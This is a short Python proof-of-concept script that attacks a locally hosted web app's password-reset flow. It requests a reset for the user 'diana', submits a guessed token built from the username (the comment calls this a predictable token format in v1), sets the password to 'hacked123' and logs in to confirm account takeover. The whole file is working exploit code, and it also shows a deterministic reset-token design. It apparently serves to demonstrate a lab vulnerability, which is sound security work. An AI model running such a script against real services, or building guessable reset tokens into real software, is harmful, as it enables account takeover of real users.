import time
import requests

BASE_URL = "http://127.0.0.1:5000"


def forgot_password(username: str):
    start = time.time()
    response = requests.post(
        f"{BASE_URL}/forgot-password",
        json={"username": username},
        timeout=10,
    )
    elapsed = time.time() - start
    return response, elapsed


def reset_password(token: str, new_password: str):
    return requests.post(
        f"{BASE_URL}/reset-password",
        json={"token": token, "new_password": new_password},
        timeout=10,
    )


def login(username: str, password: str):
    return requests.post(
        f"{BASE_URL}/login",
        json={"username": username, "password": password},
        timeout=10,
    )


def main():
    victim_username = "diana"
    attacker_new_password = "hacked123"

    print("[1] Trigger forgot-password for victim...")
    fp_response, elapsed = forgot_password(victim_username)
    print("status:", fp_response.status_code, "time:", round(elapsed, 4), "s")
    print("body:", fp_response.text)

    # Vulnerability: predictable token format in v1.
    predicted_token = f"reset-{victim_username}"
    print("\n[2] Use predicted token:", predicted_token)

    rp_response = reset_password(predicted_token, attacker_new_password)
    print("status:", rp_response.status_code)
    print("body:", rp_response.text)

    print("\n[3] Verify takeover by logging in with victim + new password...")
    login_response = login(victim_username, attacker_new_password)
    print("status:", login_response.status_code)
    print("body:", login_response.text)


if __name__ == "__main__":
    main()

